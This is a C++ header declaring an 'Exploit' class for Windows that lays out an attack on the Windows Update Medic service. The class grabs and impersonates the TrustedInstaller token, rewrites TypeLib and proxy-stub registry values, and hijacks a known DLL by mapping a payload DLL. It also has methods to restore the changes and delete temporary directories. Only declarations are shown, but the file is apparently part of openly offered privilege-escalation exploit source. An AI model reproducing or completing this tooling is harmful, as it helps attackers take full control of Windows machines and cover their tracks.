#pragma once

#include <Windows.h>
#include <tlhelp32.h>
#include <vector>

class Exploit
{
private:
    ULONG _BaseNamedObjectsHandle;
    ULONG_PTR _KnownDllDirectoryHandleAddr;
    DWORD _WaaSMedicSvcPid;
    LPWSTR _WaaSMedicCapsulePath;
    HANDLE _WaaSMedicCapsuleHandle;
    HANDLE _TiToken;
    HANDLE _DllSectionHandle;
    HANDLE _DummyDllFileHandle;
    HANDLE _ProxyStubDllLoadEventHandle;
    LPWSTR _TypeLibPath;
    LPWSTR _TypeLibOrigPath;
    LPWSTR _TypeLibRegValuePath;
    LPWSTR _ProxyStubOrigPath;
    LPWSTR _ProxyStubRegValuePath;
    LPWSTR _ProxyStubDllLoadEventName;
    LPWSTR _HollowedDllPath;
    LPWSTR _HijackedDllName;
    LPWSTR _HijackedDllSectionPath;
    BOOL _StatePluginDllLocked;
    BOOL _StateRegTypeLibModified;
    BOOL _StateTypeLibCreated;
    BOOL _StateRegProxyStubModified;
    std::vector<LPWSTR> _TemporaryDiretoriesBefore;
    std::vector<LPWSTR> _TemporaryDiretoriesAfter;
    
public:
    Exploit();
    ~Exploit();
    BOOL Run();
    BOOL Restore();
    HANDLE GetTiToken();
    
private:
    // Getters
    DWORD GetWaaSMedicSvcPid();
    LPWSTR GetTypeLibPath();
    LPWSTR GetTypeLibRegValuePath();
    LPWSTR GetTypeLibOrigPath();
    LPWSTR GetWaaSMedicCapsulePath();
    LPWSTR GetProxyStubRegValuePath();
    LPWSTR GetProxyStubOrigPath();
    LPWSTR GetProxyStubDllLoadEventName();
    LPWSTR GetHijackedDllName();
    LPWSTR GetHijackedDllSectionPath();
    // Helpers
    BOOL RestartWaaSMedicSvc();
    BOOL FindWaaSMedicSvcPid();
    BOOL LockPluginDll();
    BOOL UnlockPluginDll();
    BOOL FindWaaSMedicSvcBaseNamedObjectsHandle();
    BOOL FindTrustedInstallerToken();
    BOOL ImpersonateTrustedInstaller();
    BOOL RevertToSelf();
    BOOL WriteTypeLib();
    BOOL DeleteTypeLib();
    BOOL FindTypeLibRegistryValuePath();
    BOOL ModifyTypeLibRegistryValue();
    BOOL RestoreTypeLibRegistryValue();
    BOOL FindWaaSMedicCapsulePath();
    BOOL FindProxyStubRegistryValuePath();
    BOOL ModifyProxyStubRegistryValue();
    BOOL RestoreProxyStubRegistryValue();
    BOOL MapPayloadDll();
    BOOL UnmapPayloadDll();
    BOOL CreateDummyDllFile();
    BOOL IsProxyStubDllLoaded();
    BOOL EnumerateTemporaryDirectories(std::vector<LPWSTR>* List);
    BOOL DeleteTemporaryDirectories();
};